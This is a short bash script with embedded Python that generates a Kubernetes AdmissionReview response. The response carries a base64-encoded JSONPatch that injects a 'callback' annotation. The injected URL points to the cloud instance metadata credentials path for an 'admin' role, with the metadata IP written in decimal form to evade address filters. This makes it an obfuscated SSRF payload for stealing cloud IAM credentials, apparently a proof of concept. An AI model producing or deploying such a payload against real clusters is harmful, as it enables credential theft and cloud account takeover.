#!/bin/bash
set -e
OUT_DIR="${OUT_DIR:-/src}"
if ! mkdir -p "$OUT_DIR" 2>/dev/null; then OUT_DIR="."; fi
export OUT_DIR
python3 - <<'INNER_PY'
import json,base64,os
from pathlib import Path
patch=[{"op":"add","path":"/metadata/annotations/scanner.example.com~1callback","value":"http://2852039166/latest/meta-data/iam/security-credentials/admin"}]
obj={"apiVersion":"admission.k8s.io/v1","kind":"AdmissionReview","response":{"uid":"demo","allowed":True,"patchType":"JSONPatch","patch":base64.b64encode(json.dumps(patch,separators=(',',':')).encode()).decode()}}
Path(os.environ['OUT_DIR'],'admission.json').write_text(json.dumps(obj,separators=(',',':'))+'\n')
INNER_PY
